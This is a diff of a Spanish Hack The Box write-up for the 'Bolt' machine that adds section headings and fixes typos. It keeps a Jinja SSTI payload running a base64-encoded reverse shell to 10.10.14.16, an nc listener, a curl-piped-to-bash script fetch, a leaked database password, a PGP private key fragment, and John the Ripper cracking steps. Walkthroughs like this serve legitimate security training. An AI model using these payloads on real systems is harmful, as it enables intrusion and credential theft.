@@ -3,6 +3,7 @@
 ![Bolt](https://user-images.githubusercontent.com/96772264/204356998-dea6b45d-78e4-40aa-a3ca-22b6d9b41c75.png)
 
 -------------------
+# Part 1: Reconocimiento básico
 
 Puertos abiertos 22(ssh), 80(http), 443(https). Nmap dice que:
 - Puerto 80: nginx
@@ -20,6 +21,9 @@ Si meto uno como test@bolt.htb dice que no está aprovado. Intente con los que o
 Si pongo la ip 10.10.11.114 si que me resuelve:  
 
 ![bolt2](https://user-images.githubusercontent.com/96772264/204357209-15ab8c85-5894-48ff-bf60-890b96b34e52.PNG)
+
+-------------------
+# Part 2: Docker Analisis 
 
 Una de las páginas es download, donde nos ofrecen una imagen docker. Es un archivo tar que al descomprimirlo se ve asi
 ```console
@@ -74,6 +78,8 @@ En la seccion de correos un tal Alexander Pierce nos ha bombardeado con emails d
 
 En la parte de /profile hay mensajes de prueba de Jonathan Burke Jr., Sarah Ross y Adam Jones
 
+-------------------
+# Part 3: STTI
 
 Como no sabemos que mas hacer podemos buscar subdominios:
 ```console
@@ -115,7 +121,12 @@ YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi82NjYgMD4mMScK
 #{{cycler.__init__.__globals__.os.popen('echo YmFz... | base64 -d | bash').read()}}
 ```
 Al darle al email de confirmacion, si nos hemos puesto en escucha con nc ```sudo nc -nlvp 666```
-Si nos ponemos a analizar el sistema con nuestro [cript](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh)
+
+
+-------------------
+# Part 4: En el sistema
+
+Si nos ponemos a analizar el sistema con nuestro [script](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh)
 ```console
 www-data@bolt:/tmp$ curl -s http://10.10.14.16/lin_info_xii.sh | bash
 ```
@@ -130,7 +141,7 @@ www-data@bolt:/etc/passbolt$ mysql -upassbolt -p
 Enter password: rT2;jW7<eY8!dX8}pQ8%
 mysql> show databases;  # passboltdb
 mysql> use passboltdb;
-mysql> sho tables; 
+mysql> show tables; 
 # 'users' no tiene nada, pero 'secret' tiene un mensaje GPG (se ve de un formato similar a las llaves)
 
 -----BEGIN PGP MESSAGE-----
@@ -145,18 +156,21 @@ oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
 ```
 Esta contraseña sirve para loguearse como eddie. Intento romper la llave privada con gpg2jhon pero no hay suerte
 
+-------------------
+# Part 5: Llave GPG escondida
+
 Si corro el script otra vez, eddie posee muchos archivos .config/google-chrome/
 En la busqueda de backups tambien nos muestran esta carpeta, en concreto carpeta Default con muchos archivos que acaban en "000003.log"
 
-En la carpeta de /google-chrome hay demasiadas cosas asi que hacemos un filtrado por cosas como "gpg" o "passbolt" ```grep -riE "passbolt|gpg"``` 
+En la carpeta de /google-chrome hay demasiadas cosas asi que hacemos un filtrado por cosas como "gpg" o "passbolt" ```grep -riE "passbolt|gpg"```   
 Damos con esta ruta todo el rato ```Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js``` pero no está está la llave GPG aunque la mencionan.
-Buscamos a ver si esta ruta existe en otro lado: ```grep -ri "didegimhafipceonhjepacocaffmoppf"``` y damos con: "/Private Local Extension/Settings/"
+Buscamos a ver si esta ruta existe en otro lado: ```grep -ri "didegimhafipceonhjepacocaffmoppf"``` y damos con: "/Private Local Extension/Settings/"  
 
-Dentro hay un archivo extremadamente largo llamado cat 000003.log con llaves gpg en un one liner (o sea hechas un churro)
+Dentro hay un archivo extremadamente largo llamado cat 000003.log con llaves gpg en un one liner (o sea hechas un churro)  
 ```
 -----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDq
 ```
-Abrimos una al azar con VIM y la formateamos bien: -> :%s/\\\\r/\r/g y :%s/\\\\n//g  
+Abrimos una al azar con VIM y la formateamos bien: -> ```:%s/\\\\r/\r/g y :%s/\\\\n//g  ```  
 ```console
 └─$ gpg2john llave1.key > hash
 └─$ john hash -w=/usr/share/wordlists/rockyou.txt
